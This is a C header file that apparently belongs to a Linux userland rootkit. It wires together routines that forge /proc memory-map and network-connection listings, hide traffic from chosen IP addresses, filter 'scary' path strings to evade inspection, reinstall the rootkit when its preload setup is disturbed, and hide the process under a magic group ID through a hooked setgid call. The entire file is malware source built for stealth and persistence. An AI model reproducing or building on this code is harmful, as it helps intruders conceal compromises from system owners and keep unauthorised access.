#ifndef HIDING_H
#define HIDING_H

#include "files/files.h"

static int ld_inconsistent(void);
static void reinstall(void);
#include "reinstall.c"

#include "evasion/evasion.h"

static int scary_path(char *string);
#include "evasion/block_strings.c"

static FILE *forge_maps(const char *pathname);
static FILE *forge_smaps(const char *pathname);
static FILE *forge_numamaps(const char *pathname);
#include "forge_maps.c"

static char *int_ip2hex(unsigned int ip);
static int is_hidden_ip(char *addr);
static int secret_connection(char line[]);
static int hidehost_alive(void);
static FILE *forge_procnet(const char *pathname);
#include "forge_procnet.c"

static void _setgid(gid_t gid){
	hook(CSETGID);
	call(CSETGID, gid);
}

static void hide_self(void){
	if(not_user(0) || getgid() == MAGIC_GID)
		return;
	_setgid(MAGIC_GID);
}

#endif
